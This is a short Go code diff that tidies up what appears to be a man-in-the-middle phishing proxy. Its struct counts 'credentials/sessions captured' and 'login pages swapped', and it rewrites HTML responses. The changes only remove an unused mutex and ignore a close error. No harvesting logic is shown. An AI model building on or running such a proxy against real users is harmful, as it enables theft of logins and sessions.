@@ -15,7 +15,6 @@ import (
 	"net/http"
 	"regexp"
 	"strings"
-	"sync"
 	"sync/atomic"
 	"time"
 
@@ -69,7 +68,6 @@ type MITMProxy struct {
 	requests atomic.Int64 // requests handled
 	harvest  atomic.Int64 // credentials/sessions captured
 	swaps    atomic.Int64 // login pages swapped
-	mu       sync.Mutex
 }
 
 // New builds the proxy handler wiring all hooks.
@@ -221,7 +219,7 @@ func (p *MITMProxy) onResponse(resp *http.Response, ctx *goproxy.ProxyCtx) *http
 	if contentTypeIsHTML(resp) {
 		// Read the whole body (bounded by MaxBody) so it can be rewritten.
 		body, err := io.ReadAll(io.LimitReader(resp.Body, MaxBody))
-		resp.Body.Close()
+		_ = resp.Body.Close()
 		if err != nil {
 			return resp
 		}
